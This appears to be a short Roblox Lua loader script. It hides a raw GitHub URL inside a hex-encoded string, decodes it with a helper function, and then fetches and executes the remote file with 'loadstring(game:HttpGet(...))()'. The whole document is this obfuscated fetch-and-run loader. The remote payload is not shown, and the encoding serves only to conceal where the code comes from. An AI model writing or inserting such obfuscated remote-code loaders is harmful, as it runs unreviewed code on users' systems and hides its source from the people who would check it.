-- Hexadecimal encoded string
local hex_url = "68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f57656c6c6974686173746f62652f4261636b656e642f726566732f68656164732f6d61696e2f6261636b656e64"

-- Function to decode hex to text
local function hex_to_string(hex)
    local str = ""
    for i = 1, #hex, 2 do
        local byte = tonumber(hex:sub(i, i + 1), 16)
        str = str .. string.char(byte)
    end
    return str
end

-- Decode the hex URL
local decoded_url = hex_to_string(hex_url)

-- Load the script from the decoded URL
loadstring(game:HttpGet(decoded_url))()
